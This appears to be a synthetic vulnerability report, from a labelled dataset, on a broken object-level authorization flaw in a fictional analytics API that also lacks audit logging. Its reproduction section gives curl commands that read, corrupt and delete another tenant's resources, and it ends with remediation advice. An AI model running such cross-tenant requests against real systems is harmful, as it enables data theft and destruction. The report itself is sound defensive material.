## System

- System: InsightGraph Analytics API v3.0.0
- Domain: DATA ANALYTICS / BI PLATFORM
- Example ID: BOLA-0095
- Risk ID: RISK-72-095

## Findings

### 1. Pattern 7.2 — Anti-Forensic Access on `/api/v2/resources/:id` (HAR Primary)

**HAR evidence**: JWT `X-Tenant-ID: ORG-2051`. Request: `GET /api/v2/resources/RES-2095`. Response: HTTP 200 OK with `"tenantId": "ORG-CFB4"`, `"sensitiveData": "CONFIDENTIAL: cross-tenant data for ORG-CFB4"`.

**Pattern 7.2 (Logging Failures — Anti-Forensic Capabilities)**: cross-tenant access to analytics resources occurs without generating security audit log entries. When the BOLA allows `ORG-2051` to read `ORG-CFB4`'s analytics resources, there is no detection signal — no alert, no audit trail entry, no anomaly flag. Section 4.0 confirms: the handler lacks tenant/owner enforcement. Section 3.0: "Application code does NOT use tenant_id in authorization checks." Without logging of authorization decisions, forensic investigation of a breach is impossible.

**Data Analytics / BI impact**: resources represent analytics dashboards, reports, or data pipeline configurations. Cross-tenant read exposes a competing analytics firm's proprietary models and business intelligence. PATCH/DELETE without logging enables a competitor to alter or destroy another firm's analytics configurations with no forensic trace — attacks go undetected indefinitely.

### 2. Write/Delete with No Audit Trail (Pattern 7.2 Extension)

Section 4.0: "GET/PATCH/DELETE `/api/v2/resources/:id`" — all verbs share the same handler. A PATCH that corrupts analytics data or a DELETE that destroys a dashboard leaves no security log entry, preventing incident response or forensic attribution.

## Evidence

- **HAR**: `GET /api/v2/resources/RES-2095` with `ORG-2051` JWT → HTTP 200 → `tenantId: ORG-CFB4` with `sensitiveData`.
- **Section 4.0 (RISK-72-095)**: Pattern 7.2 — GET/PATCH/DELETE lack tenant/owner filter.
- **Section 3.0**: Application code does not use `tenant_id` in authorization checks.

## Reproduction

**Step 1 — Baseline:**

```bash
curl -s "https://api.insightgraph-an.example.com/api/v2/resources/RES-1095" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-2051>" \
  -H "X-Tenant-ID: ORG-2051"
```

Expected: `tenantId: "ORG-2051"`.

**Step 2 — Cross-tenant analytics resource read (primary HAR attack):**

```bash
curl -s "https://api.insightgraph-an.example.com/api/v2/resources/RES-2095" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-2051>" \
  -H "X-Tenant-ID: ORG-2051"
```

Expected secure: HTTP 403 or 404.  
Expected vulnerable: HTTP 200 with `tenantId: "ORG-CFB4"` and analytics resource data.

**Step 3 — Anti-forensic write: corrupt analytics data with no audit trail (Pattern 7.2):**

```bash
curl -s -X PATCH "https://api.insightgraph-an.example.com/api/v2/resources/RES-2095" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-2051>" \
  -H "X-Tenant-ID: ORG-2051" \
  -H "Content-Type: application/json" \
  -d '{"status": "deleted", "sensitive_data": "corrupted_by_attacker"}'
```

Expected secure: HTTP 403.  
Expected vulnerable: HTTP 200 — competitor's analytics resource corrupted, no audit log entry generated.

**Step 4 — Anti-forensic delete: destroy analytics resource:**

```bash
curl -s -X DELETE "https://api.insightgraph-an.example.com/api/v2/resources/RES-2095" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-2051>" \
  -H "X-Tenant-ID: ORG-2051"
```

## Remediation

- **Add `WHERE tenant_id = $jwt_tenant_id AND owner_id = $jwt_sub`** to GET/PATCH/DELETE handlers (RISK-72-095, unblock DB migration #DB-195).
- **Implement authorization audit logging**: every resolved request must log `sub`, `tenant_id`, `resource_id`, HTTP method, and authorization decision (allow/deny). Cross-tenant mismatches must generate security alerts.
- **Regression test**: Tenant A token requests Tenant B `resource_id` — assert HTTP 403/404.
